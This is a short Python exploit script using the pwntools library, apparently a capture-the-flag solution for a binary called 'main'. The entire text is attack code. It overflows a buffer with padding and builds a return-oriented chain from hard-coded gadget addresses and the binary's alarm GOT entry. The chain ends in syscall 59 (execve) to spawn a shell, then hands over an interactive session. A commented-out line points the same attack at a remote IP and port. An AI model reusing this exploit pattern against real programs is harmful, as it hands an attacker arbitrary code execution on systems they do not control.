from pwn import*
p = process('./main')
#p = remote('39.101.210.214',10005)
pop_rax_syscall = 0x401153
gadget_I = 0x4011F2
gadget_Ii = 0x4011D8
elf =ELF('./main')
payload = 'U'*0x28 + p64(gadget_I) + p64(0) + p64(1) + p64(0x402016) + p64(0) + p64(0) + p64(elf.got['alarm'])
payload += p64(gadget_Ii) + p64(0)*7 + p64(pop_rax_syscall) + p64(59)
p.sendline(payload)
p.interactive()
